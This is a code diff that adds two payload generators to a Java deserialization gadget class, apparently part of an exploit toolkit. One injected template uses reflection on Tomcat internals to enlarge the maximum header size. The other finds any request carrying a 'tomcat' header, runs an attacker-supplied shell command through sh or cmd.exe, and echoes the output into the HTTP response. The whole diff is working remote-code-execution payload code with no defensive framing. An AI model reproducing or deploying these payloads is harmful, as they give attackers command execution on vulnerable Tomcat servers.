@@ -94,6 +94,87 @@ public class Gadgets {
     public static Object createTemplatesImpl(final String command) throws Exception {
         return createTemplatesImpl(command, "");
     }
+    public static Object createTemplatesImplTomcatHeader(final String command) throws Exception {
+        String template = "try {\n" +
+            "            java.lang.reflect.Field contextField = org.apache.catalina.core.StandardContext.class.getDeclaredField(\"context\");\n" +
+            "            java.lang.reflect.Field serviceField = org.apache.catalina.core.ApplicationContext.class.getDeclaredField(\"service\");\n" +
+            "            java.lang.reflect.Field requestField = org.apache.coyote.RequestInfo.class.getDeclaredField(\"req\");\n" +
+            "            java.lang.reflect.Field handlerField = org.apache.coyote.AbstractProtocol.class.getDeclaredField(\"handler\");\n" +
+            "            contextField.setAccessible(true);\n" +
+            "            serviceField.setAccessible(true);\n" +
+            "            requestField.setAccessible(true);\n" +
+            "            handlerField.setAccessible(true);\n" +
+            "            org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase =\n" +
+            "                    (org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();\n" +
+            "            org.apache.catalina.core.ApplicationContext applicationContext = (org.apache.catalina.core.ApplicationContext) contextField.get(webappClassLoaderBase.getResources().getContext());\n" +
+            "            org.apache.catalina.core.StandardService standardService = (org.apache.catalina.core.StandardService) serviceField.get(applicationContext);\n" +
+            "            org.apache.catalina.connector.Connector[] connectors = standardService.findConnectors();\n" +
+            "            for (int i=0;i<connectors.length;i++) {\n" +
+            "                if (4==connectors[i].getScheme().length()) {\n" +
+            "                    org.apache.coyote.ProtocolHandler protocolHandler = connectors[i].getProtocolHandler();\n" +
+            "                    ((org.apache.coyote.http11.AbstractHttp11Protocol)protocolHandler).setMaxHttpHeaderSize("+command+");\n" +
+            "                }\n" +
+            "            }\n" +
+            "        }catch (Exception e){\n" +
+            "        }";
+        return createTemplatesImpl(command, template);
+    }
+    public static Object createTemplatesImplTomcatEcho2(final String command) throws Exception {
+
+        String template = "try {\n" +
+            "            java.lang.reflect.Field contextField = org.apache.catalina.core.StandardContext.class.getDeclaredField(\"context\");\n" +
+            "            java.lang.reflect.Field serviceField = org.apache.catalina.core.ApplicationContext.class.getDeclaredField(\"service\");\n" +
+            "            java.lang.reflect.Field connectorsField = org.apache.catalina.core.StandardService.class.getDeclaredField(\"connectors\");\n" +
+            "            java.lang.reflect.Field requestField = org.apache.coyote.RequestInfo.class.getDeclaredField(\"req\");\n" +
+            "            java.lang.reflect.Field handlerField = org.apache.coyote.AbstractProtocol.class.getDeclaredField(\"handler\");\n" +
+            "            contextField.setAccessible(true);\n" +
+            "            serviceField.setAccessible(true);\n" +
+            "            requestField.setAccessible(true);\n" +
+            "            handlerField.setAccessible(true);\n" +
+            "            org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase =\n" +
+            "                    (org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();\n" +
+            "            org.apache.catalina.core.ApplicationContext applicationContext = (org.apache.catalina.core.ApplicationContext) contextField.get(webappClassLoaderBase.getResources().getContext());\n" +
+            "            org.apache.catalina.core.StandardService standardService = (org.apache.catalina.core.StandardService) serviceField.get(applicationContext);\n" +
+            "            org.apache.catalina.connector.Connector[] connectors = standardService.findConnectors();\n" +
+            "            for (int i=0;i<connectors.length;i++) {\n" +
+            "                if (4==connectors[i].getScheme().length()) {\n" +
+            "                    org.apache.coyote.ProtocolHandler protocolHandler = connectors[i].getProtocolHandler();\n" +
+            "                        Class[] classes = org.apache.coyote.AbstractProtocol.class.getDeclaredClasses();\n" +
+            "                        for (int j=0;j<classes.length;j++) {\n" +
+            "                            if (52 == (classes[j].getName().length())) {\n" +
+            "                                java.lang.reflect.Field globalField = classes[j].getDeclaredField(\"global\");\n" +
+            "                                java.lang.reflect.Field processorsField = org.apache.coyote.RequestGroupInfo.class.getDeclaredField(\"processors\");\n" +
+            "                                globalField.setAccessible(true);\n" +
+            "                                processorsField.setAccessible(true);\n" +
+            "                                org.apache.coyote.RequestGroupInfo requestGroupInfo = (org.apache.coyote.RequestGroupInfo) globalField.get(handlerField.get(protocolHandler));\n" +
+            "                                java.util.List list = (java.util.List)processorsField.get(requestGroupInfo);\n" +
+            "                                for (int k=0;k<list.size();k++) {\n" +
+            "                                    org.apache.coyote.Request tempRequest = (org.apache.coyote.Request) requestField.get(list.get(k));\n" +
+            "                                    if (\"tomcat\".equals(tempRequest.getHeader(\"tomcat\"))) {\n" +
+            "                                        org.apache.catalina.connector.Request request = (org.apache.catalina.connector.Request) tempRequest.getNote(1);\n" +
+            "                                        String cmd = \""+command+"\";\n" +
+            "                                        String[] cmds = !System.getProperty(\"os.name\").toLowerCase().contains(\"win\") ? new String[]{\"sh\", \"-c\", cmd} : new String[]{\"cmd.exe\", \"/c\", cmd} ;" +
+            "                                        java.io.InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();\n" +
+            "                                        java.util.Scanner s = new java.util.Scanner(in).useDelimiter(\"\\\\a\");\n" +
+            "                                        String output = s.hasNext() ? s.next():\"\";\n" +
+            "                                        java.io.Writer writer = request.getResponse().getWriter();\n" +
+            "                                        java.lang.reflect.Field usingWriter = request.getResponse().getClass().getDeclaredField(\"usingWriter\");\n" +
+            "                                        usingWriter.setAccessible(true);\n" +
+            "                                        usingWriter.set(request.getResponse(),Boolean.FALSE);\n" +
+            "                                        writer.write(output);\n" +
+            "                                        writer.flush();\n" +
+            "                                        break;\n" +
+            "                                    }\n" +
+            "                                }\n" +
+            "                        }\n" +
+            "                    }\n" +
+            "                    break;\n" +
+            "                }\n" +
+            "            }\n" +
+            "        }catch (Exception e){\n" +
+            "        }";
+        return createTemplatesImpl(command, template);
+    }
 
     public static Object createTemplatesImplTomcatEcho(final String command) throws Exception {
         String param = command == null ? "cmd" : command;
